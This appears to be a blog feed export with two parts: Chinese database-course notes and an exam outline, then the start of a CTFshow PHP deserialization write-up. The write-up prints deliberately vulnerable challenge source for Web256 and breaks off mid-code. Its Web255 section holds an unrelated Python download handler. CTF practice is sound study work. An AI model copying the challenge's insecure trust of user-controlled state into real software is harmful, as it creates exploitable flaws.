称实体集E1与实体集E2具有多对多联系，记为m:n。</li><li>多个实体集之间多对多联系的定义:若实体型Ej（j=1，2，…，i-1，i+1，…，n）中的给定实体，和Ei中的多个实体相联系，则Ei与E1，E2，…，Ei-1，Ei+1，…，En之间的联系是多对多的</li></ol></blockquote><h4 id="数据模型的组成要素"><a href="#数据模型的组成要素" class="headerlink" title="数据模型的组成要素"></a>数据模型的组成要素</h4><ul><li>数据结构：描述数据的类型、内容、性质及数据间的联系，是对系统静态特征的描述，是数据模型中最基本的部分，不同的数据模型采用不同的数据结构。</li><li>数据操作：主要描述在相应的数据结构上允许执行的操作的集合，包括操作以及有关的操作规则，是对系统动态特征的描述。对数据库的操作主要有查询和更新（插入、删除、修改）两类操作</li><li>完整性约束：主要描述数据结构内的数据及其联系所具有的制约和依存规则，用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确性、有效性和相容性。</li></ul><p>关系模型：建立在严格的数学概念基础之上，采用二维表来表示实体和实体之间的联系，是目前应用最多、最重要的一种数据模型</p><blockquote><p>关系（Relation）一个关系对应通常说的一张表。<br>元组（Tuple）表中的一行即为一个元组。（第一行除外）<br>属性（Attribute）表中的一列即为一个属性，列名即是属性名，列值即是属性值<br>域（Domain）：属性的取值范围。<br>分量：元组中的一个属性值<br>码（Key）：属性或属性的组合，能唯一确定一个元组。一个关系中可以有多个码。<br>关系模式：对关系的描述，表示为:关系名（属性1，属性2，…，属性n）</p></blockquote><h3 id="1-5-数据库系统的内部结构"><a href="#1-5-数据库系统的内部结构" class="headerlink" title="1.5 数据库系统的内部结构"></a>1.5 数据库系统的内部结构</h3><p>数据库系统内部采用三级模式二级映像结构，三级模式为：外模式，模式，内模式。二级映像：外模式/模式映射，模式/内模式映射</p><p>1．模式：是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只能有一个概念模式。<br>2．内模式：是数据库中全体数据的物理结构和存储方式的描述，是数据在数据库内部的表示方式，一个数据库只能有一个内模式。</p><p>3．外模式：又称为子模式或用户模式，是模式的子集，是数据库用户能够看到和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示，一个数据库可以有多个外模式。</p><p>4．外模式/模式映像：对于每一个外模式，都有一个外模式/模式映像。它定义了该外模式与模式之间的对应关系。</p><p>5．模式/内模式映像，数据库中有唯一的一个模式/内模式映像，它定义了数据全局逻辑结构与存储结构之间的对应关系。</p><h3 id="1-6-数据库系统的外部结构"><a href="#1-6-数据库系统的外部结构" class="headerlink" title="1.6 数据库系统的外部结构"></a>1.6 数据库系统的外部结构</h3><p>略</p><h3 id="1-7-常见的关系数据库"><a href="#1-7-常见的关系数据库" class="headerlink" title="1.7 常见的关系数据库"></a>1.7 常见的关系数据库</h3><blockquote><p>Oracle数据库</p><p>由数据库软件领域的第一大厂商     Oracle公司研发<br>主要应用于大型企业数据库领域；跨平台，支持Windows、UNIX等多种操作系统；运行稳定、功能齐全、性能超群</p></blockquote><blockquote><p>SQL Server数据库管理系统            由微软公司研发的中大型数据库管理系统<br>只能运行于Windows平台上；界面友好，易学易用；支持C/S、B/S模式</p></blockquote><blockquote><p>Sybase                                               由Sybase公司研发的大型数据库管理系统<br>可以运行于UNIX、VXM、Windows等多种操作系统平台上，支持标准的SQL语言：使用C/S工作模式</p></blockquote><blockquote><p>DB2<br>是IBM公司研发的一个多媒体、Web关系型数据库<br>起初主要应用在大型机上，目前支持多种机型</p></blockquote><blockquote><p>MySQL                                               Oracle公司旗下产品<br>体积小、速度快、功能有限；开放源码软件</p></blockquote><h2 id="第2章-数据库系统原理"><a href="#第2章-数据库系统原理" class="headerlink" title="第2章 数据库系统原理"></a>第2章 数据库系统原理</h2><h3 id="2-1关系的形式化定义及有关概念"><a href="#2-1关系的形式化定义及有关概念" class="headerlink" title="2.1关系的形式化定义及有关概念"></a>2.1关系的形式化定义及有关概念</h3><p>关系模型以集合代数理论为基础，本节将从集合论角度给出关系的形式化定义</p><blockquote><ol><li>域（Domain）</li><li>笛卡尔积（Cartesian Product）</li><li>关系（Relation）</li></ol></blockquote><p><strong>域</strong>是一组具有相同数据类型的值的集合，又称为值域，用D 表示.</p><p>**笛卡尔积(Cartesian Product)**给定一组域D1,D2,…,Dn,它们中可以有相同的域。D1,D2,…,Dn的笛卡尔积为:D=D1×D2×…×Dn＝{(d1,d2,…,dn)｜diDi,i＝1,2,…,n}</p><p>笛卡尔积的元组可以用二维表的形式表示</p><p><strong>关系（Relation）</strong>D1×D2×…×Dn的有意义的子集称为在域D1，D2，…，Dn上的关系，表示为R（D1，D2，…，Dn） student(sno,sname,ssex)，R：关系名，n：关系的目或度（Degree）<br>当n=1 时，称该关系为单元关系，当 n=2时，称该关系为二元关系</p><blockquote><p>列是同质的，即每一列的分量是同一类型的数据，来自同一个域；<br>属性名是唯一的，不同的列可以出自同一个域，但属性名必须不同；<br>码的唯一性，即任意两个元组的码不能相同，从而任意两个元组不相同；<br>列的顺序无关性，即交换任意两列的次序，得到的还是同一个关系；<br>行的顺序无关性，即交换任意两行的次序，得到的还是同一个关系；<br>分量的原子性，即每个分量都是不可分的数据项。</p></blockquote><p>关系模式:关系模式是对一个关系结构的描述，包括关系由哪些属性构成，这些属性来自哪些域，以及属性和域之间的映射关系(mapping)。因此，一个关系模式应当是一个五元组。<br>关系模式（Relation Schema）是对关系的描述，可形式化地表示为R (U，D，DOM，F)      student(sno, sname, ssex)</p><blockquote><p>R为关系模式名<br>U为组成该关系的属性名的集合<br>D为属性组U中属性所来自的域的集合<br>DOM为属性向域映像的集合<br>F为属性间函数依赖关系的集合</p></blockquote><ul><li>关系  关系是由满足关系模式结构的元组构成的集合，是关系模式在某一时刻的状态或内容</li><li>关系数据库  在一个给定的应用领域中，所有实体entity以及实体间联系(relationship)的集合构成一个关系数据库</li></ul><h3 id="2-2关系数据库示例"><a href="#2-2关系数据库示例" class="headerlink" title="2.2关系数据库示例"></a>2.2关系数据库示例</h3><ol><li>码（Key）：又称为候选码（Candidate  Key）能唯一标识关系中的每一个元组的最少属性的集合。一个关系可能有多个候选码</li><li>主码（Primary  Key）：又称为主键，在候选码中选出一个即可作为主码在一个关系中，主码只能有一个</li><li>全码（ALL- Key）：关系中所有属性的组合才是该关系的码，一个关系最多只有一个全码</li><li>外码（Foreign  Key）：设属性F是关系R的一个属性，但不是R的码，如果F与关系S中的主码Ks相对应，则称F是R的外码，R为参照关系（Referencing  Relation），S为被参照关系（Referenced  Relation）。R和S不一定是不同的关系，通过外码可以建立两个表之间的联系，在一个关系中，外码可能有多个</li><li>主属性（Prime  Attribute）：包含在所有候选码中的属性称为主属性</li><li>非主属性（Nonprime  Attribute）：不包含在任何一个候选码中的属性称为非主属性。</li></ol><h3 id="2-3关系模型的完整性"><a href="#2-3关系模型的完整性" class="headerlink" title="2.3关系模型的完整性"></a>2.3关系模型的完整性</h3><blockquote><p>作用：为了确保数据库里边的数据是正确的、有效的、一致的。</p></blockquote><p><strong>实体完整性</strong>(Entity Integrity)：1.若属性A是基本关系R的主属性，则属性A不能取空值；2.关系的所有的主属性都不能取空值，而不仅是主码整体不能取空值</p><p><strong>参照完整性</strong>若属性（或属性组）F是基本关系R的外码，它与基本关系S的主码KS相对应,则对于R中的每个元组在F上的值必须为：要么取空值，要么等于被参照关系中的主键的某个值</p><p><strong>用户自定义完整性</strong>属性的取值应当满足用户定义的约束条件，反映了某一具体应用所涉及的数据必须满足的语义要求。</p><h3 id="2-4关系模型的数据操作"><a href="#2-4关系模型的数据操作" class="headerlink" title="2.4关系模型的数据操作"></a>2.4关系模型的数据操作</h3><p>数据模型三要素：数据结构、数据操作、完整性约束</p><p>数据查询(Query)：选择(Select)、投影(Project)、连接(Join)、除(Divide)、并(Union)、交(Intersection)、差(Difference)、笛卡儿积<br>数据更新(Update)：插入(Insert)、删除(Delete)、修改(Modify)</p><h3 id="2-5关系代数"><a href="#2-5关系代数" class="headerlink" title="2.5关系代数"></a>2.5关系代数</h3><p>关系代数是一种抽象的查询语言，是研究关系数据语言的数学工具</p><h4 id="关系的运算符"><a href="#关系的运算符" class="headerlink" title="关系的运算符"></a>关系的运算符</h4><blockquote><ul><li>集合运算符：将关系看成元组的集合运算，是从关系的“水平”方向即行的角度来进行</li><li>专门的关系运算符：不仅涉及行而且涉及列</li><li>比较运算符：辅助专门的关系运算符进行操作</li><li>逻辑运算符：辅助专门的关系运算符进行操作</li></ul></blockquote><h4 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h4><h5 id="并"><a href="#并" class="headerlink" title="并"></a>并</h5><p>关系R和关系S的要求：具有相同的目n，即两个关系都有n个属性，相应的属性取自同一个域。</p><blockquote><p>$$<br>R∪S 结果仍为n目关系，由属于R或属于S的元组组成R∪S = { t|t \in R∨t \in S }<br>$$</p></blockquote><h5 id="差"><a href="#差" class="headerlink" title="差"></a>差</h5><p>关系R和关系S的要求：具有相同的目n，相应的属性取自同一个域</p><blockquote><p>$$<br>R - S<br>结果仍为n目关系，由属于R而不属于S的所有元组组成<br>                R -S = { t|t\in R∧t \notin S }<br>$$</p></blockquote><h5 id="交"><a href="#交" class="headerlink" title="交"></a>交</h5><p>关系R和关系S的要求：具有相同的目n，相应的属性取自同一个域</p><blockquote><p>$$<br>R∩S<br>结果仍为n目关系，由既属于R又属于S的元组组成,R∩S = { t|t \in R∧t \in S }<br>$$</p></blockquote><h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><pre class="line-numbers language-none"><code class="language-none">R：n目关系，k1个元组S：m目关系，k2个元组R×S：列：（n+m）列的元组的集合，元组的前n列是关系R的一个元组，后m列是关系S的一个元组行：k1×k2个元组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$$<br>R×S = { tr∩ts |tr \in R ∧ ts \in S }<br>$$</p><h4 id="专门的关系运算"><a href="#专门的关系运算" class="headerlink" title="专门的关系运算"></a>专门的关系运算</h4><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><h5 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h5><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><h5 id="除"><a href="#除" class="headerlink" title="除"></a>除</h5><h2 id="第5章-数据库的安全性"><a href="#第5章-数据库的安全性" class="headerlink" title="第5章  数据库的安全性"></a>第5章  数据库的安全性</h2><blockquote><p>数据库的安全性是指保护数据库，以防止不合法的使用造成数据泄露、更改或破坏<br>不合法的使用一般是指合法用户进行的非法操作以及非法用户进行的所有操作<br>数据库的安全性就是保证所有合法的用户进行合法的操作</p></blockquote><h3 id="5-1-计算机安全性概述"><a href="#5-1-计算机安全性概述" class="headerlink" title="5.1 计算机安全性概述"></a>5.1 计算机安全性概述</h3><p>计算机系统的安全性问题可分为三大类：技术安全，管理安全，政策法律</p><h3 id="5-2-数据库安全性控制"><a href="#5-2-数据库安全性控制" class="headerlink" title="5.2 数据库安全性控制"></a>5.2 数据库安全性控制</h3><p>在一般的计算机系统中，安全措施是一级一级层层设置的</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657872425851.png"></p><h4 id="用户标识与鉴别"><a href="#用户标识与鉴别" class="headerlink" title="用户标识与鉴别"></a>用户标识与鉴别</h4><p>用户标识与鉴别是数据库系统的最外层安全保护措施<br>其方法是由系统提供一定的方式让用户标识自己的身份，每次用户要求进入系统时，由系统进行核对，通过鉴定后才会提供系统使用权</p><h4 id="存取控制机制"><a href="#存取控制机制" class="headerlink" title="存取控制机制"></a>存取控制机制</h4><p>数据库的安全性措施中最重要的是DBMS的存取控制机制</p><p>合法权限检查<br>当用户发出存取数据的操作请求后，DBMS查找数据字典，根据安全规则进行合法权限检查。<br>若用户的操作请求超出了定义的权限，系统将拒绝执行该操作。</p><p>大多数DBMS支持的存取控制策略主要有两种：自主存取控制，强制存取控制</p><p>自主存取控制方法的特点如下：<br>① 同一用户对于不同的数据库对象有不同的存取权限；<br>② 不同的用户对同一对象也有不同的权限；<br>③ 用户还可将其拥有的存取权限转授给其他用户</p><p>强制存取控制</p><p>在MAC中，DBMS管理的全部实体分为主体和客体<br>主体<br>是指系统中活动的实体，如用户、进程等<br>客体<br>是系统中的被动实体，如文件、基本表、视图等<br>对主体和客体的每一个实例（值）都指派一个敏感度标记<br>主体的敏感度标记称为“许可证级别”<br>客体的敏感度标记称为“密级”<br>敏感度标记的级别从高到低依次为：绝密、机密、可信和公开等</p><p>强制存取控制方法的特点如下：<br>① 每一个数据对象被标以一定的密级；<br>② 每一个用户也被授予某一个级别的许可证；<br>③ 通过对比主体和客体的级别，最终确定主体能否存取客体，只有具有合法许可证的用户才可以存取数据。<br>在MAC中，主体存取客体要遵循如下规则：<br>① 仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体；<br>② 仅当主体的许可证级别等于客体的密级时，该主体才能写相应的客体。</p><h4 id="视图机制"><a href="#视图机制" class="headerlink" title="视图机制"></a>视图机制</h4><p>在进行存取权限控制时，可以为不同的用户定义不同的视图，把数据对象限制在一定的范围内<br>也就是说，通过视图机制把要保密的数据对无权存取的用户隐藏起来，从而自动地对数据提供一定程度的<br>但视图机制的安全保护功能太不精细，往往不能达到应用系统的要求，其主要功能在于提供了数据库的逻辑独立性<br>在实际应用中，通常将视图机制与授权机制结合起来使用，首先利用视图机制屏蔽一部分保密数据，然后在视图上再进一步定义存取权限安全保护</p><h4 id="审计跟踪"><a href="#审计跟踪" class="headerlink" title="审计跟踪"></a>审计跟踪</h4><p>审计功能是一种监视措施，它把用户对数据库的所有操作自动记录下来，存入审计日志中<br>记录的内容一般包括：操作类型（查询、插入、更新、删除），操作终端标识与操作者标识，操作日期和时间，操作所涉及的相关数据，数据的前象和后象等<br>DBA可以利用审计跟踪的信息，重现导致数据库现有状况的一系列事件，找出非法存取数据的人、时间和内容等。<br>审计通常是很费时间和空间的，所以DBMS把它作为系统的可选特征，DBA根据应用环境对安全性的要求，可以灵活地打开或关闭审计功能。</p><h4 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h4><p>数据加密是防止数据库中数据在存储和传输中失密的有效手段<br>加密的基本思想是根据一定的算法将原始数据变化为不可直接识别的格式，数据以密文的形式存储和传输<br>加密方法主要有两种<br>一种是替换方法<br>一种是置换方法<br>数据加密功能通常也作为可选特征</p><h4 id="统计数据库的安全性"><a href="#统计数据库的安全性" class="headerlink" title="统计数据库的安全性"></a>统计数据库的安全性</h4><h2 id="第6章-事务与并发控制"><a href="#第6章-事务与并发控制" class="headerlink" title="第6章  事务与并发控制"></a>第6章  事务与并发控制</h2><h3 id="6-1-事务"><a href="#6-1-事务" class="headerlink" title="6.1 事务"></a>6.1 事务</h3><p>事务（Transaction）是用户定义的一个数据库操作序列，这些操作要么全做，要么全不做，是一个不可分割的工作单位。</p><p>一个程序在后台运行时通常被分割成多个事务，即一个程序由多个事务组成。事务可以是一条SQL语句，一组SQL语句或整个程序<br>事务的划分有两种方式：隐式划分，显式划分</p><h4 id="事务的特征"><a href="#事务的特征" class="headerlink" title="事务的特征:"></a><strong>事务的特征:</strong></h4><ol><li><p>原子性：事务是数据库的逻辑工作单位，是不可分割的工作单元，事务中的诸操作要么都做，要么都不做。</p></li><li><p>持久性：也称永久性，一个事务一旦提交它对数据库中数据的改变就应该是永久性的，接下来的其他操作或故障不应该对其执行结果由任何影响</p></li><li><p>隔离性：一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对于其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</p></li><li><p>一致性：事务的执行结果必须是使数据库从一个一致性状态变到另一个一致性状态，一致性状态是指数据库中只包含成功事务提交的结果，不一致状态是指数据库中包含失败事务提交的部分结果。</p></li></ol><h4 id="事务的执行方式"><a href="#事务的执行方式" class="headerlink" title="事务的执行方式"></a><strong>事务的执行方式</strong></h4><ol><li><p>串行：按顺序依次执行，执行完一个事务后才能开始另一个事务</p></li><li><p>交叉并发执行：是指多个事务轮流交叉并发执行</p></li></ol><h3 id="6-2-并发控制"><a href="#6-2-并发控制" class="headerlink" title="6.2 并发控制"></a>6.2 并发控制</h3><p>丢失修改:</p><p>丢失修改的含义：两个事务T1和T2读取同一数据并分别进行修改，T1先提交了修改结果，T2后提交的修改结果覆盖了T1提交的结果，导致T1的修改结果丢失</p><p>读“脏”数据:</p><p>读“脏”数据的含义：事务T1修改某一数据，并将其写回磁盘。事务T2读取同一数据后，事务T1由于某种原因被撤销，这时事务T1修改过的数据恢复原值，而事务T2读取到的是一个过渡性的不再需要的脏数据，与数据库中的数据不同。</p><p>不可重复读:</p><h3 id="6-3-封锁"><a href="#6-3-封锁" class="headerlink" title="6.3 封锁"></a>6.3 封锁</h3><h3 id="6-4-并发调度的可串行性"><a href="#6-4-并发调度的可串行性" class="headerlink" title="6.4 并发调度的可串行性"></a>6.4 并发调度的可串行性</h3><h3 id="6-5-两段锁协议"><a href="#6-5-两段锁协议" class="headerlink" title="6.5 两段锁协议"></a>6.5 两段锁协议</h3><h1 id="数据库系统原理复习大纲"><a href="#数据库系统原理复习大纲" class="headerlink" title="数据库系统原理复习大纲"></a>数据库系统原理复习大纲</h1><blockquote><p>一、选择题共20个小题，共20分。</p><p>复习要求：以课后习题中的选择题为主</p><p>二、简答题共4个小题，共20分，</p><p>复习要求：以课后习题中的简答题为主，重点复习以下几个。</p><p>第一章：</p><p><strong>7.简述数据库的三级模式二级映像结构</strong></p><p>数据库三级模式分别是外模式，模式，内模式，二级映像是指内模式与模式的映像，模式与外模式之间的映像。</p><p>模式是全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图</p><p>内模式是全体数据的物理结构和存储方式的描述，是数据库的内部表示方法。</p><p>外模式也称子模式，是模式的子集，是数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图 一个数据库可以有多个外模式。</p><p><strong>8.简述数据与应用程序的逻辑独立性与物理独立性</strong></p><p>对于每一个外模式，数据库系统都有一个外模式/模式映射。当模式被改变时，数据库管理员对各个外模式/模式映射做相应的改变，可以使外模式保持不变，保证了数据与程序的逻辑独立性。</p><p>数据库中只有一个模式和一个内模式，所以模式/内模式的映射是唯一的，它定义了数据库的全局逻辑结构与存储结构之间的对应关系。当数据库的存储结构被改变时，数据库管理员对模式/内模式映射做相应的改变，可以使模式保持不变，应用程序相应地也不做变动。这样，保证了数据与程序的物理独立性。</p><p><strong>3. 关系的性质</strong></p><p>关系是规范化二维表中行的集合</p><p>列是同质的，即每一列的分量是同一类型的数据，来自同一个域。</p><p>属性名是唯一的，不同列可出自同一个域，但属性名必须不同。</p><p>码的唯一性，任意两个元组的码不能相同，从而任意两个码不能相同。</p><p>列的顺序无关性，即交换任意两列的次序，得到的还是同一个关系。</p><p>行的顺序无关性，即交换任意两行的次序，得到的还是同一个关系。</p><p>分量的原子性，即每个分量都是不可分的数据项</p><p><strong>2简述相关子查询和不相关子查询的区别：</strong></p><p>一、处理次数不同</p><p>1、相关子查询：相关子查询被多次处理，需要重复求值以供外部查询使用。</p><p>2、不相关子查询：不相关子查询的处理一次完成，执行后传递给外部查询。</p><p>二、依赖不同</p><p>1、相关子查询：相关子查询中的查询条件取决于外部查询中的值。</p><p>2、不相关子查询：无关子查询是独立于外部查询的子查询，不依赖于外部查询中的值。</p><p>三、效率不同</p><p>1、相关子查询：相关子查询可以嵌套在多个层中，但嵌套层越多，效率越低。</p><p>2、不相关子查询：不相关子查询不能嵌套，效率高于相关子查询。</p><p><strong>3 简述视图的定于及分类</strong></p><p>视图是外模式的基本单位，是从一个或几个基本表导出来的虚拟的表，是到基本表的一种映射，视图中不存储数据，只存放视图的定义。</p><p><strong>2.简述显示游标的处理步骤：</strong></p><p>声明游标，打开游标，处理数据，关闭游标</p><p><strong>3.简述MAC中主体存取客体要遵守的规则</strong></p><p>仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体</p><p>仅当主体的许可证级别等于客体的密级时，该主体才能写相应的客体</p><p><strong>1.简述事务的概念及特征</strong></p><p>事务的概念:</p><p>事务是并发控制的基本单位，是用户定义的一个数据库操作序列，这些操作要么全做要么全不做是不可划分的工作单位</p><p>事务的特征:</p><ol><li><p>原子性：事务是数据库的逻辑工作单位，是不可分割的工作单元，事务中的诸操作要么都做，要么都不做。</p></li><li><p>持久性：也称永久性，一个事务一旦提交它对数据库中数据的改变就应该是永久性的，接下来的其他操作或故障不应该对其执行结果由任何影响</p></li><li><p>隔离性：一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对于其他事务是隔离的，并发执行的各个事务之间不能互相干扰。</p></li><li><p>一致性：事务的执行结果必须是使数据库从一个一致性状态变到另一个一致性状态，一致性状态是指数据库中只包含成功事务提交的结果，不一致状态是指数据库中包含失败事务提交的部分结果。</p></li></ol><p><strong>1. 简述事务故障及其恢复步骤</strong></p><p>事务故障是事务在运行至正常终止前被终止，这时恢复子系统应该用日志文件撤销（UNDO）此事务已对数据库进行的修改。事务故障的恢复是由系统自动完成的，对用户是透明的。系统具体恢复步骤是：</p><p>反向扫描日志文件，即从最后向前扫描日志文件，查找该事务的更新操作。</p><p>对该事务更新操作逆操作，即将日志文件更新前的值写入数据库。如果记录中操作是插入操作，则对其执行删除操作；如果记录中操作是删除操作，则对其执行插入操作；如果记录中操作是修改操作，则用修改前的值代替修改后的值。</p><p>继续反向扫描日志文件，查找该事务的其他操作，做同样操作；</p><p>如此反复，直至扫描到此事务的开始标记。</p><p><strong>2.简述系统故障及其恢复步骤</strong></p><p>系统故障的恢复是由系统在启动时，由系统自动完成的，不需要用户干扰。具体恢复步骤是：</p><p>正向扫描日志文件，标记事务。即从头扫描日志文件，找出在故障发生前已经提交的事务（既有BEGIN TRANSACTION记录，也有COMMIT记录），并将其记入重做记录（REDO-LIST），同时找出故障发生时尚未完成的记录（只有BEGIN TRANSACTION记录，没有COMMIT记录），将其记入撤销队列。</p><p>对撤销队列中的事务进行撤销操作，反向扫描日志文件，对每个撤销事务的操作执行逆操作，将日志文件更新前的值写入数据库。</p><p>对重做队列中的事务重做处理。正向扫描日志文件，对每个重做事务执行日志文件登记，将日志文件中的更新后的值写入数据库。</p><p>三、SQL操作题共10个小题，共20分。包含关系代数操作和SQL语句操作。</p><p>  复习要求：参照第二章的课后习题三.2和第三章课后习题三。</p><p>四、数据库编程题，共2题，共10分。</p><p>  复习要求：创建存储过程和触发器，参照第四章的补充资料里的例题、课后作业题及相应的实验内容。</p><p>五、关系模式判断题2个，共14分，一个是抽象的关系模式判断，一个是具体的关系模式判断。</p><p>  复习要求：参照P233例6和第八章课后习题里相关的题目。</p><p>六、数据库设计题1个，共16分</p><p>  复习要求：参照第九章的课后习题三。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web入门反序列化</title>
      <link href="/2022/07/11/CTFshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/07/11/CTFshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>PHP反序列化实际上已经开始是Web安全的进阶操作了，虽然在这个时代Web选手上分极其困难，PHP反序列化已经成为了基础…..</p><p>学这一块还是推荐多看博客和菜鸟教程对PHP魔术方法的介绍，这里推荐一个<a href="https://y4tacker.blog.csdn.net/article/details/113588692">PHP反序列化这一篇就够了</a></p><h3 id="Web254"><a href="#Web254" class="headerlink" title="Web254"></a>Web254</h3><p>这个题为什么会出现在反序列化里面？直接出username=xxxxxx&amp;password=xxxxxx</p><h3 id="Web255"><a href="#Web255" class="headerlink" title="Web255"></a>Web255</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>url <span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"网站地址不能为空!"</span><span class="token punctuation">,</span> <span class="token string">"错误信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>    <span class="token comment"># print(self.url)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        match<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> match<span class="token punctuation">:</span>            download<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Web256"><a href="#Web256" class="headerlink" title="Web256"></a>Web256</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token 